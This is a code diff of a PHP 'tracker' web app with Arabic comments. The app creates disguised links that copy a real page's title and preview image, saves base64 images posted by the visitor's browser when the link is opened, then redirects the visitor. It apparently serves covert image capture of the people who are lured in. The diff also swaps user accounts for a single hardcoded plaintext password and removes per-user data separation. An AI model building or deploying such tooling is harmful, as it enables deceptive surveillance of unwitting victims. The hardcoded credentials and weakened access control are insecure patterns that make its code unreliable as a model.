@@ -5,75 +5,16 @@ session_start();
 ini_set('display_errors', 0);
 error_reporting(0);
 
-try {
-    $db = new PDO('sqlite:tracker_pro.db');
-    $db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
+// التحقق من تسجيل الدخول
+$password_correct = 'aziz123';
 
-    // جدول المستخدمين
-    $db->exec("CREATE TABLE IF NOT EXISTS users (
-        id INTEGER PRIMARY KEY AUTOINCREMENT,
-        username TEXT UNIQUE,
-        password TEXT
-    )");
-
-    // جدول الروابط (مرتبط بالمستخدم)
-    $db->exec("CREATE TABLE IF NOT EXISTS links (
-        id INTEGER PRIMARY KEY AUTOINCREMENT, 
-        user_id INTEGER,
-        code TEXT UNIQUE, 
-        target_url TEXT, 
-        meta_title TEXT,
-        meta_image TEXT,
-        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
-    )");
-
-    // جدول الصور الملتقطة (مرتبط بالمستخدم)
-    $db->exec("CREATE TABLE IF NOT EXISTS captures (
-        id INTEGER PRIMARY KEY AUTOINCREMENT, 
-        user_id INTEGER,
-        code TEXT, 
-        image_data TEXT, 
-        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
-    )");
-
-    // إدخال البروفايلات الأربعة الافتراضية إذا لم تكن موجودة
-    $default_users = [
-        ['salah', 'salah123'],
-        ['smail', 'smail123'],
-        ['aziz', 'aziz123'],
-        ['ahmad', 'ahmad123']
-    ];
-
-    foreach ($default_users as $u) {
-        $stmt = $db->prepare("SELECT id FROM users WHERE username = ?");
-        $stmt->execute([$u[0]]);
-        if (!$stmt->fetch()) {
-            $insertUser = $db->prepare("INSERT INTO users (username, password) VALUES (?, ?)");
-            $insertUser->execute([$u[0], password_hash($u[1], PASSWORD_DEFAULT)]);
-        }
-    }
-
-} catch (Exception $e) {
-    die("Database Error");
-}
-
-// معالجة تسجيل الدخول
-if (isset($_POST['login_username']) && isset($_POST['login_password'])) {
-    $username = trim($_POST['login_username']);
-    $password = $_POST['login_password'];
-
-    $stmt = $db->prepare("SELECT * FROM users WHERE username = ?");
-    $stmt->execute([$username]);
-    $user = $stmt->fetch(PDO::FETCH_ASSOC);
-
-    if ($user && password_verify($password, $user['password'])) {
+if (isset($_POST['login_password'])) {
+    if ($_POST['login_password'] === $password_correct) {
         $_SESSION['authenticated'] = true;
-        $_SESSION['user_id'] = $user['id'];
-        $_SESSION['username'] = $user['username'];
         header("Location: " . $_SERVER['PHP_SELF']);
         exit();
     } else {
-        $login_error = "اسم المستخدم أو كلمة المرور غير صحيحة!";
+        $login_error = "كلمة المرور غير صحيحة!";
     }
 }
 
@@ -83,14 +24,35 @@ if (isset($_GET['logout'])) {
     exit();
 }
 
-// معالجة طلبات الحذف (يجب أن يكون المستخدم مسجلاً لديه صلاحية)
-if (isset($_SESSION['authenticated']) && $_SESSION['authenticated'] === true && $_SERVER['REQUEST_METHOD'] === 'POST') {
-    $current_user_id = $_SESSION['user_id'];
+try {
+    $db = new PDO('sqlite:tracker_pro.db');
+    $db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
 
+    $db->exec("CREATE TABLE IF NOT EXISTS links (
+        id INTEGER PRIMARY KEY AUTOINCREMENT, 
+        code TEXT UNIQUE, 
+        target_url TEXT, 
+        meta_title TEXT,
+        meta_image TEXT,
+        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
+    )");
+
+    $db->exec("CREATE TABLE IF NOT EXISTS captures (
+        id INTEGER PRIMARY KEY AUTOINCREMENT, 
+        code TEXT, 
+        image_data TEXT, 
+        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
+    )");
+} catch (Exception $e) {
+    die("Database Error");
+}
+
+// معالجة طلبات الحذف (يتطلب مصادقة)
+if (isset($_SESSION['authenticated']) && $_SESSION['authenticated'] === true && $_SERVER['REQUEST_METHOD'] === 'POST') {
     if (isset($_POST['delete_id'])) {
         $id_to_delete = intval($_POST['delete_id']);
-        $stmt = $db->prepare("DELETE FROM captures WHERE id = ? AND user_id = ?");
-        $stmt->execute([$id_to_delete, $current_user_id]);
+        $stmt = $db->prepare("DELETE FROM captures WHERE id = ?");
+        $stmt->execute([$id_to_delete]);
         header("Location: " . $_SERVER['PHP_SELF'] . (!empty($_GET['track']) ? '?track=' . urlencode($_GET['track']) : ''));
         exit();
     }
@@ -98,12 +60,11 @@ if (isset($_SESSION['authenticated']) && $_SESSION['authenticated'] === true && 
     if (isset($_POST['delete_all'])) {
         $track_code = trim($_POST['track_code'] ?? '');
         if (!empty($track_code)) {
-            $stmt = $db->prepare("DELETE FROM captures WHERE code = ? AND user_id = ?");
-            $stmt->execute([$track_code, $current_user_id]);
+            $stmt = $db->prepare("DELETE FROM captures WHERE code = ?");
+            $stmt->execute([$track_code]);
             header("Location: " . $_SERVER['PHP_SELF'] . '?track=' . urlencode($track_code));
         } else {
-            $stmt = $db->prepare("DELETE FROM captures WHERE user_id = ?");
-            $stmt->execute([$current_user_id]);
+            $db->exec("DELETE FROM captures");
             header("Location: " . $_SERVER['PHP_SELF']);
         }
         exit();
@@ -150,14 +111,13 @@ if (isset($_GET['r'])) {
         $target_redirect = $link['target_url'];
         $og_title = $link['meta_title'];
         $og_image = $link['meta_image'];
-        $link_user_id = $link['user_id'];
 
         if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['save_capture'])) {
             $img_base64 = $_POST['image'] ?? '';
             if (!empty($img_base64)) {
                 try {
-                    $capStmt = $db->prepare("INSERT INTO captures (user_id, code, image_data, created_at) VALUES (?, ?, ?, ?)");
-                    $capStmt->execute([$link_user_id, $code, $img_base64, date('Y-m-d H:i:s')]);
+                    $capStmt = $db->prepare("INSERT INTO captures (code, image_data, created_at) VALUES (?, ?, ?)");
+                    $capStmt->execute([$code, $img_base64, date('Y-m-d H:i:s')]);
                 } catch (Exception $e) {}
             }
             exit('OK');
@@ -178,26 +138,21 @@ if (isset($_SESSION['authenticated']) && $_SESSION['authenticated'] === true && 
     $meta = fetch_real_meta($target_url);
     $code = substr(md5(uniqid(rand(), true)), 0, 7);
     
-    $stmt = $db->prepare("INSERT INTO links (user_id, code, target_url, meta_title, meta_image) VALUES (?, ?, ?, ?, ?)");
-    $stmt->execute([$_SESSION['user_id'], $code, $target_url, $meta['title'], $meta['image']]);
+    $stmt = $db->prepare("INSERT INTO links (code, target_url, meta_title, meta_image) VALUES (?, ?, ?, ?)");
+    $stmt->execute([$code, $target_url, $meta['title'], $meta['image']]);
 
     $tracking_code = $code;
     $domain = $_SERVER['HTTP_HOST'];
     $generated_link = "https://" . $domain . "/?r=" . $code;
 }
 
-if (isset($_SESSION['authenticated']) && $_SESSION['authenticated'] === true) {
-    $current_user_id = $_SESSION['user_id'];
-    $filter_code = trim($_GET['track'] ?? '');
-    if (!empty($filter_code)) {
-        $stmt = $db->prepare("SELECT * FROM captures WHERE user_id = ? AND code = ? ORDER BY id DESC");
-        $stmt->execute([$current_user_id, $filter_code]);
-        $captures = $stmt->fetchAll(PDO::FETCH_ASSOC);
-    } else {
-        $stmt = $db->prepare("SELECT * FROM captures WHERE user_id = ? ORDER BY id DESC LIMIT 30");
-        $stmt->execute([$current_user_id]);
-        $captures = $stmt->fetchAll(PDO::FETCH_ASSOC);
-    }
+$filter_code = trim($_GET['track'] ?? '');
+if (!empty($filter_code)) {
+    $stmt = $db->prepare("SELECT * FROM captures WHERE code = ? ORDER BY id DESC");
+    $stmt->execute([$filter_code]);
+    $captures = $stmt->fetchAll(PDO::FETCH_ASSOC);
+} else {
+    $captures = $db->query("SELECT * FROM captures ORDER BY id DESC LIMIT 30")->fetchAll(PDO::FETCH_ASSOC);
 }
 
 if (isset($_GET['r']) && !empty($target_redirect)):
@@ -331,7 +286,7 @@ endif;
     <div class="container">
 
         <?php if (!isset($_SESSION['authenticated']) || $_SESSION['authenticated'] !== true): ?>
-            <!-- نموذج تسجيل الدخول المحدث -->
+            <!-- نموذج تسجيل الدخول -->
             <div class="login-wrapper">
                 <div class="panel login-card">
                     <h2>Secure Terminal Access</h2>
@@ -339,16 +294,15 @@ endif;
                         <div class="error-msg"><?php echo $login_error; ?></div>
                     <?php endif; ?>
                     <form method="POST" style="display: flex; flex-direction: column; gap: 12px;">
-                        <input type="text" name="login_username" placeholder="Username (e.g. salah)" required autofocus>
-                        <input type="password" name="login_password" placeholder="Password..." required>
+                        <input type="password" name="login_password" placeholder="Enter Password..." required autofocus>
                         <button type="submit" class="btn" style="width: 100%;">Login</button>
                     </form>
                 </div>
             </div>
         <?php else: ?>
-            <!-- لوحة التحكم الكاملة مع عرض اسم المستخدم الحالي -->
+            <!-- لوحة التحكم الكاملة -->
             <div class="top-bar">
-                <h1 style="font-size: 16px; color: var(--text);">Secure Terminal Dashboard — Welcome, <span style="color: var(--accent);"><?php echo htmlspecialchars($_SESSION['username']); ?></span></h1>
+                <h1 style="font-size: 16px; color: var(--text);">Secure Terminal Dashboard</h1>
                 <a href="?logout=1" class="btn btn-secondary" style="height: 36px; font-size: 12px; padding: 0 14px; text-decoration: none;">تسجيل الخروج</a>
             </div>
             
